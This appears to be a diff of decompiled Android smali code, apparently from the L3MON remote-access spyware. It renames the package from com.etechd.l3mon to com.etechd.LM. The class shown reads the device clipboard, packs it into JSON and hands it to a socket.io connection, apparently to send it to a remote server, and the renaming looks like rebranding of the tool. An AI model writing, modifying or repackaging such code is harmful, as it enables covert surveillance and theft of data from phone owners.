@@ -1,4 +1,4 @@
-.class Lcom/etechd/l3mon/MainService$1;
+.class Lcom/etechd/LM/MainService$1;
 .super Ljava/lang/Object;
 .source "MainService.java"
 
@@ -8,7 +8,7 @@
 
 # annotations
 .annotation system Ldalvik/annotation/EnclosingMethod;
-    value = Lcom/etechd/l3mon/MainService;->onStartCommand(Landroid/content/Intent;II)I
+    value = Lcom/etechd/LM/MainService;->onStartCommand(Landroid/content/Intent;II)I
 .end annotation
 
 .annotation system Ldalvik/annotation/InnerClass;
@@ -18,16 +18,16 @@
 
 
 # instance fields
-.field final synthetic this$0:Lcom/etechd/l3mon/MainService;
+.field final synthetic this$0:Lcom/etechd/LM/MainService;
 
 
 # direct methods
-.method constructor <init>(Lcom/etechd/l3mon/MainService;)V
+.method constructor <init>(Lcom/etechd/LM/MainService;)V
     .locals 0
-    .param p1, "this$0"    # Lcom/etechd/l3mon/MainService;
+    .param p1, "this$0"    # Lcom/etechd/LM/MainService;
 
     .line 44
-    iput-object p1, p0, Lcom/etechd/l3mon/MainService$1;->this$0:Lcom/etechd/l3mon/MainService;
+    iput-object p1, p0, Lcom/etechd/LM/MainService$1;->this$0:Lcom/etechd/LM/MainService;
 
     invoke-direct {p0}, Ljava/lang/Object;-><init>()V
 
@@ -40,11 +40,11 @@
     .locals 8
 
     .line 46
-    iget-object v0, p0, Lcom/etechd/l3mon/MainService$1;->this$0:Lcom/etechd/l3mon/MainService;
+    iget-object v0, p0, Lcom/etechd/LM/MainService$1;->this$0:Lcom/etechd/LM/MainService;
 
     const-string v1, "clipboard"
 
-    invoke-virtual {v0, v1}, Lcom/etechd/l3mon/MainService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
+    invoke-virtual {v0, v1}, Lcom/etechd/LM/MainService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
 
     move-result-object v0
 
@@ -99,11 +99,11 @@
     invoke-virtual {v4, v5, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
 
     .line 55
-    invoke-static {}, Lcom/etechd/l3mon/IOSocket;->getInstance()Lcom/etechd/l3mon/IOSocket;
+    invoke-static {}, Lcom/etechd/LM/IOSocket;->getInstance()Lcom/etechd/LM/IOSocket;
 
     move-result-object v5
 
-    invoke-virtual {v5}, Lcom/etechd/l3mon/IOSocket;->getIoSocket()Lio/socket/client/Socket;
+    invoke-virtual {v5}, Lcom/etechd/LM/IOSocket;->getIoSocket()Lio/socket/client/Socket;
 
     move-result-object v5
 
